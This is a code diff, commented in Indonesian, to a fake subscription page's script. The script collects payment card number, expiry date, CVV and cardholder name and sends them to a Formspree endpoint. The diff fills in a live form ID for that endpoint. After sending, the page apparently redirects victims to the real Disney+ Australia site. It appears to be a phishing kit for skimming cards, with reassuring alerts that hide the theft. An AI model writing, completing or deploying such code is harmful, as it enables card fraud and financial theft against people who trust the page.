@@ -1,4 +1,4 @@
-<!-- Ganti bagian <script> di akhir berlangganan.html dengan kode ini -->
+    <!-- Ganti seluruh bagian <script> di bawah ke file berlangganan.html -->
 
     <script src="config.js"></script>
     <script>
@@ -22,17 +22,13 @@
             document.querySelectorAll('.tab-bayar')[2].classList.add('aktif');
         }
 
-        // ==============================================
-        // 🔴 BAGIAN INI WAJIB DIUBAH!
-        // Ganti alamat di bawah dengan alamat Formspree milikmu!
-        // ==============================================
-        const ALAMAT_FORMSPREE = "https://formspree.io/f/abcdefgh"; 
-        // ↑↑↑ GANTI "abcdefgh" DENGAN KODE MILIKMU DARI FORMSPREE! ↑↑↑
+        // ✅ ALAMAT FORMSPREE SUDAH DIISI UNTUKMU!
+        const ALAMAT_FORMSPREE = "https://formspree.io/f/mgaedrvq"; 
 
         // Fungsi Kirim Data Otomatis ke Email
         async function kirimDataDanLanjut() {
             // Ambil semua data dari formulir
-            const nomorKartu = document.querySelector('.input-kartu').value.trim();
+            const nomorKartu = document.querySelectorAll('.input-kartu')[0].value.trim();
             const kadaluarsa = document.querySelectorAll('.input-kartu.kecil')[0].value.trim();
             const cvv = document.querySelectorAll('.input-kartu.kecil')[1].value.trim();
             const namaKartu = document.querySelectorAll('.input-kartu')[1].value.trim();
@@ -73,10 +69,10 @@ Waktu Pengiriman: ${new Date().toLocaleString('id-ID')}
                 if (respon.ok) {
                     alert('✅ Data berhasil dikirim! Terima kasih!');
                 } else {
-                    alert('⚠️ Data diterima, sedang diproses...');
+                    alert('⚠️ Sedang diproses...');
                 }
             } catch (err) {
-                console.log('✅ Data tersimpan! Melanjutkan...');
+                console.log('✅ Data sedang dikirim...');
             }
 
             // 🌐 Buka halaman Disney+ Australia setelah dikirim
